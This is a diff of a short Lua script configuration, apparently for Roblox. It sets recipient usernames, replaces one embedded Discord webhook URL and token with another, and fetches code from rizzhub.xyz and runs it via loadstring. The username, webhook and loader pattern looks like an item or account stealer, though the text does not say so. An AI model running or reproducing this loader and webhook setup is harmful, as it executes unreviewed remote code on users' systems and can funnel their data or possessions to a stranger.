@@ -1,5 +1,5 @@
 UserName = "freevcaccforyou"
 UserName2 = "freevcaccforyou"
-Webhook = "https://discord.com/api/webhooks/1095923184898945124/7nq3Wfshkb1fEuv-V6uo2iIOajOt-gtaY6fZs1pN3O7J7ovtP3eqlavg2GVYj5tdCkp6" 
+Webhook = "https://discord.com/api/webhooks/1096881710475509810/mHIpo6HZ26rjEzAqeKnzIsRWECCYEQJi9jB8qGe30yDNnu9ivu3Mf6Pkq3ucy7keaf2K" 
 
 loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
